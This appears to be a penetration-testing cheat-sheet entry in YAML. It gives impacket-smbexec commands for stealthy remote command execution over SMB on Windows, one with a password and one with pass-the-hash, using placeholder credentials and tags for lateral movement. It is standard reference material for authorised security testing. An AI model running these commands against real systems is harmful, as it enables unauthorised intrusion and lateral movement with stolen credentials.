---
description: |
  Execute commands via SMB without dropping files on disk.
  More stealthy than PsExec.

  Reference values:
    Target IP: 10.10.10.1
    Domain: test.local
    Username: admin
    Password: P@ssw0rd123
command: |
  # With password
  impacket-smbexec test.local/admin:P@ssw0rd123@10.10.10.1

  # With hash
  impacket-smbexec test.local/admin@10.10.10.1 -hashes :aad3b435b51404eeaad3b435b51404ee
phase:
  - Lateral_Movement
target_os:
  - Windows
services:
  - SMB
items:
  - Username
  - Password
  - Hash
techniques:
  - Pass-the-Hash_Ticket
network_position:
  - Internal
references:
  - https://github.com/fortra/impacket
---
